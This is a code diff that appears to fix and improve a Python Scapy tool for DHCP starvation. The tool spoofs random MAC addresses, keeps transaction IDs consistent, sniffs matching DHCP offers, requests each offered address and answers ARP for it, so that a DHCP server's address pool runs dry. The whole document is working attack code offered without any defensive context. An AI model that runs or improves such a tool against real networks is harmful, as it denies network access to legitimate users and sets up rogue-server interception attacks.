@@ -9,27 +9,25 @@ is_running = False
 starve_thread = None
 
 
-def dhcp_discover(spoofed_mac, i_face):
+def dhcp_discover(spoofed_mac, xid, i_face):
     ip_dest = '255.255.255.255'
     mac_dest = "ff:ff:ff:ff:ff:ff"
-    dsc = Ether(src=mac2str(spoofed_mac), dst=mac_dest, type=0x0800)
+    dsc = Ether(src=spoofed_mac, dst=mac_dest)
     dsc /= IP(src='0.0.0.0', dst=ip_dest)
     dsc /= UDP(sport=68, dport=67)
-    dsc /= BOOTP(chaddr=mac2str(spoofed_mac),
-                 xid=random.randint(1, 1000000000),
-                 flags=0xFFFFFF)
+    dsc /= BOOTP(chaddr=mac2str(spoofed_mac), xid=xid, flags=0x8000)
     dsc /= DHCP(options=[("message-type", "discover"), "end"])
     sendp(dsc, iface=i_face, verbose=False)
     print("[+] Discover sent")
 
 
-def dhcp_request(req_ip, spoofed_mac, server_ip, i_face):
+def dhcp_request(req_ip, spoofed_mac, server_ip, xid, i_face):
     ip_dest = '255.255.255.255'
     mac_dest = "ff:ff:ff:ff:ff:ff"
-    req = Ether(src=mac2str(spoofed_mac), dst=mac_dest)
+    req = Ether(src=spoofed_mac, dst=mac_dest)
     req /= IP(src="0.0.0.0", dst=ip_dest)
     req /= UDP(sport=68, dport=67)
-    req /= BOOTP(chaddr=mac2str(spoofed_mac), xid=random.randint(1, 1000000000))
+    req /= BOOTP(chaddr=mac2str(spoofed_mac), xid=xid)
     req /= DHCP(
         options=[("message-type", "request"),
                  ("server_id", server_ip),
@@ -46,7 +44,6 @@ def arp_reply(src_ip, source_mac, server_ip, server_mac, i_face):
 
 def _starve_loop(target_ip, i_face, persistent):
     global is_running
-    cur_ip = 0
     server_mac = None
 
     if target_ip:
@@ -59,45 +56,57 @@ def _starve_loop(target_ip, i_face, persistent):
 
     while is_running:
         counter = 0
-        mac = RandMAC()
-        dhcp_discover(spoofed_mac=mac, i_face=i_face)
+        mac = str(RandMAC())
+        xid = random.randint(1, 1000000000)
+        dhcp_discover(spoofed_mac=mac, xid=xid, i_face=i_face)
+
+        offered_ip = None
+        server_ip = None
 
         while is_running:
-            p = sniff(count=1, filter="udp and (port 67 or 68)", timeout=3)
+            # Filter specifically for our transaction ID and a DHCP Offer message type (2)
+            packets = sniff(
+                count=1,
+                filter="udp and (port 67 or 68)",
+                timeout=3,
+                iface = i_face,
+                lfilter=lambda p: DHCP in p and p[BOOTP].xid == xid and any(
+                    opt[0] == 'message-type' and opt[1] == 2 for opt in p[DHCP].options if isinstance(opt, tuple)
+                )
+            )
+
             if not is_running:
                 break
-            if not len(p):
+
+            if not packets:
                 if not persistent and counter >= 3:
                     print("[-] Finishing attack loop (no replies)")
                     return
                 counter += 1
-                dhcp_discover(spoofed_mac=mac, i_face=i_face)
+                dhcp_discover(spoofed_mac=mac, xid=xid, i_face=i_face)
                 continue
 
-            if DHCP in p[0]:
-                if p[0][DHCP].options[0][1] == 2:
-                    ip = p[0][BOOTP].yiaddr
-                    src = p[0][IP].src
-                    if not target_ip and not src == cur_ip:
-                        cur_ip = src
-                        try:
-                            ans = sr1(ARP(op=1, pdst=str(src)), timeout=2, verbose=False)
-                            if ans:
-                                server_mac = ans[ARP].hwsrc
-                        except Exception:
-                            pass
-                    if src == target_ip or not target_ip:
-                        break
-                    continue
-
-        if not is_running:
+            p = packets[0]
+            offered_ip = p[BOOTP].yiaddr
+            server_ip = p[IP].src
             break
 
-        target_server = target_ip if target_ip != 0 else cur_ip
-        dhcp_request(req_ip=str(ip), spoofed_mac=mac, server_ip=str(target_server), i_face=i_face)
+        if not is_running or not offered_ip:
+            continue
+
+        target_server = target_ip if target_ip else server_ip
+
+        if not server_mac and target_server:
+            try:
+                ans = sr1(ARP(op=1, pdst=str(target_server)), timeout=2, verbose=False)
+                if ans:
+                    server_mac = ans[ARP].hwsrc
+            except Exception:
+                pass
+
+        dhcp_request(req_ip=offered_ip, spoofed_mac=mac, server_ip=target_server, xid=xid, i_face=i_face)
         if server_mac:
-            arp_reply(src_ip=str(ip), source_mac=mac, server_ip=str(target_server), server_mac=server_mac,
-                      i_face=i_face)
+            arp_reply(src_ip=offered_ip, source_mac=mac, server_ip=target_server, server_mac=server_mac, i_face=i_face)
 
 
 def start_starve(target_ip=0, i_face=conf.iface, persistent=False):
